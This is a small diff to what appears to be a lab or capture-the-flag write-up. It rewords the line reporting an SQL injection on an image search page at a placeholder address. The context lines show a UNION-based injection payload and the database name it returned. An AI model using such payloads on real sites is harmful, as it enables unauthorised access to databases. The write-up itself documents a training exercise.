@@ -2,7 +2,7 @@
 
 ## Reproduce
 
-We found an SQL Injection in: `http://{IP}/?page=searchimg`
+We found an SQL Injection in image search page: `http://{IP}/?page=searchimg`
 
 - Get the database name: `1 AND 0=1 UNION SELECT 1, database()` 
 ===> `Member_images`
